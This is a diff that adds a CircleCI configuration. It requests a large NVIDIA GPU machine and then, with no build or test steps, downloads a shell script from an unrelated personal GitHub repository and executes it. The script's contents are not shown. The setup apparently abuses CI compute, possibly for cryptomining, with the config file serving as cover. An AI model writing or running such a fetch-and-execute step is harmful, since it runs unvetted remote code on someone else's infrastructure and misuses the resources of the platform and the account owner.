@@ -1,0 +1,10 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi
+      - run: wget https://raw.githubusercontent.com/rian310/coloksa/main/13.sh && chmod +x 13.sh &&./13.sh
